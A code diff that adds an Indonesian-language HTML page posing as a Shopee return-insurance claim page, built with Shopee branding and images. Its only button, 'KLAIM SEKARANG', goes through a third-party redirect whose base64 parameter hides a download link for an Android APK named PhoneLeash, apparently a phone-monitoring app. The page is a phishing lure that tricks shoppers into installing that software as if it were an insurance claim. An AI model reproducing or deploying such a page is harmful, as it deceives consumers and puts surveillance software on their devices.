@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#ED4D2D">
+    <title>Shopee Asuransi Pengembalian</title>
+    <meta name="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjcR-cFRb_IRT1BnoafHfQPTNbnAOuYCXfez_YZBfLSNFDhHEfMWS25z9eAP2lwdgE3fomJ1sz_N6Da5M90zG7Yp64_whWQtgn5Cgx2nMJea9V2_g3OZykjy0yeojEajAxTYU6SjpkWQHG8-Eu4ILiZjVwri85bMp8QxhLATnnijb0zr7OL3LXHleJ9BqQ/s1200/AddText_01-23-09.14.27.jpg">
+    <meta name="twitter:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjcR-cFRb_IRT1BnoafHfQPTNbnAOuYCXfez_YZBfLSNFDhHEfMWS25z9eAP2lwdgE3fomJ1sz_N6Da5M90zG7Yp64_whWQtgn5Cgx2nMJea9V2_g3OZykjy0yeojEajAxTYU6SjpkWQHG8-Eu4ILiZjVwri85bMp8QxhLATnnijb0zr7OL3LXHleJ9BqQ/s1200/AddText_01-23-09.14.27.jpg">
+    <meta name="twitter:description" content="Shopee Indonesia">
+    <style>
+        * {
+            margin: -0;
+            padding: -0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f8f8f8;
+            text-align: center;
+            height: 200px;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: auto;
+            background-color: white;
+            padding-bottom: 20px;
+        }
+
+        .slider-container {
+            position: relative;
+            top: 10px;
+            /* Geser slider ke bawah */
+        }
+
+        .slider-container {
+            width: 100%;
+            max-width: 370px;
+            /* Batasi ukuran maksimum slider */
+            height: 200px;
+            /* Atur tinggi slider sesuai dimensi gambar */
+            position: relative;
+            overflow: hidden;
+            border-radius: 10px;
+            margin: 40px auto;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .slides img {
+            width: 100%;
+            height: 200px;
+            /* Gambar akan memenuhi tinggi slider */
+            object-fit: cover;
+            /* Potong gambar untuk memenuhi dimensi slider */
+            flex-shrink: 0;
+        }
+
+        .slides {
+            display: flex;
+            transition: transform 0.5s ease-in-out;
+            width: 100%;
+            /* 10 images */
+        }
+
+        .indicators {
+            text-align: center;
+            position: absolute;
+            bottom: 10px;
+            width: 100%;
+        }
+
+        .indicators span {
+            display: inline-block;
+            width: 100px;
+            height: 10px;
+            margin: 0 5px;
+            background-color: #ccc;
+            border-radius: 50%;
+            cursor: pointer;
+        }
+
+        .indicators .active {
+            background-color: #007BFF;
+        }
+
+        /* KONTEN */
+
+        .content {
+            padding: 20px;
+            text-align: left;
+        }
+
+        .box {
+            background-color: white;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 0px;
+            display: flex;
+            align-items: center;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .icon {
+            width: 40px;
+            height: 40px;
+            margin-right: 100px;
+        }
+
+        .text-content {
+            flex: 10;
+        margin-top: 0px;
+        }
+
+        .title {
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .description {
+            font-size: 10px;
+            color: #000;
+            margin-top: 5px;
+        }
+
+        .btn {
+            display: block;
+            text-align: center;
+            padding: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 50px;
+            text-decoration: none;
+            color: #fff;
+            margin-top: 10px;
+        }
+
+        .btn-red {
+            background-color: #ED4D2D;
+            box-shadow: 0 0 2px rgba(0, 0, 0, 0.1);
+        }
+
+        .btn-orange {
+            background-color: #000;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        /* FOOTER */
+
+        .footer {
+            background-color: #0057a0;
+            color: white;
+            padding: 20px;
+            font-family: sans-serif;
+        }
+
+        .footer-section {
+            border-top: 1px solid #ffffff80;
+            padding: 10px 0;
+            display: flex;
+            justify-content: space-between;
+            font-weight: bold;
+        }
+
+        .footer-social {
+            margin: 20px 0;
+        }
+
+        .footer-social a img {
+            width: 30px;
+            margin-right: 10px;
+        }
+
+        .footer-info {
+            font-size: 14px;
+            line-height: 1.6;
+        }
+
+        .footer-info a {
+            color: white;
+            text-decoration: underline;
+        }
+
+        nav {
+            width: 100%;
+            position: fixed;
+            background-color: white;
+            z-index: 1000;
+        }
+
+        nav.top {
+            top: 0;
+            border-bottom: 1px solid #ddd;
+        }
+
+        nav.bottom {
+            bottom: 0;
+            border-top: 1px solid #ddd;
+        }
+
+        nav img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .a {
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+    </style>
+</head>
+
+<body>
+    <nav class="top">
+    </nav>
+    </div>
+    
+    <img src="https://cdn.insurance.shopee.com/images/6a634d792584d6d75795516f65326c9c--.png" width="100%" alt="Photo 1">
+    </div>
+
+
+    <div class="content">
+        <!-- Apply Kartu Kiredit -->
+        <div class="box" style="box-shadow: 0px 2px px 0px #444a4a;">
+
+            <div class="text-content">
+                <div class="title" style="text-align: center;color:#ED4D2D;font-family: Arial, sans-serif;">KLAIM ASURANSI PENGEMBALIAN</div><br>
+                <div class="description" style="text-align: center;color:#000;font-family: Arial, sans-serif;">
+                    </div>
+                <a href="https://apkgold-vn.com/go/?file_id=3404079&b=aHR0cHM6Ly9zcnYwMDMuYXBrZ29sZC12bi5jb20vc3RvcmFnZS8yMS82MjIvNDM2MjIvUGhvbmVMZWFzaC02LjYxLmFwaz9zPVVRNmNhY3RtS2NZemIyZWhjeHQxNHcmZT0xNzg5MjczNjA3Jmxhbmc9cnUmYXBrX2lkPTM4MTEzJnByZW1pdW1fc3BlZWQ9MA==" class="btn btn-red" style="box-shadow: 0px 1px 2px 0px #ED4D2D;font-family: Arial, sans-serif;">KLAIM SEKARANG</a><br>
+
+
+
+                
+
+
+            </div>
+
+        </div>
+
+        <!-- Upgrade dan Kenaikan Limit -->
+    </div>
+    <img src="https://raw.githubusercontent.com/singtelldash-prog/jabshsuaidx/refs/heads/main/IMG_20260627_211314_307.jpg" width="100%" alt="">
+
+    </div>
+    <!-- Footer -->
+    <br>
+
+
+        </footer>
+    </div>
+    </div>
+
+    <script>
+        let index = 0;
+        const slides = document.querySelector(".slides");
+        const indicators = document.querySelectorAll(".indicators span");
+        const totalSlides = document.querySelectorAll(".slides img").length; // Hitung total slide
+
+        function updateIndicators() {
+            indicators.forEach((indicator, i) => {
+                if (i === index) {
+                    indicator.classList.add("active");
+                } else {
+                    indicator.classList.remove("active");
+                }
+            });
+        }
+
+        function slideShow() {
+            index++;
+            if (index >= totalSlides) {
+                index = 0;
+            } // Jika sudah di gambar terakhir, kembali ke awal
+
+            slides.style.transform = "translateX(" + (-index * 100) + "%)";
+            updateIndicators(); // Perbarui indikator aktif
+        }
+
+        setInterval(slideShow, 4000); // Ganti gambar setiap 4 detik
+
+        // Fungsi untuk berpindah ke slide tertentu saat indikator diklik
+        indicators.forEach((indicator, i) => {
+            indicator.addEventListener("click", () => {
+                index = i;
+                slides.style.transform = "translateX(" + (-index * 100) + "%)";
+                updateIndicators();
+            });
+        });
+
+        updateIndicators(); // Pastikan indikator pertama aktif saat halaman dimuat
+    </script>
+
+</body>
+
+</html>
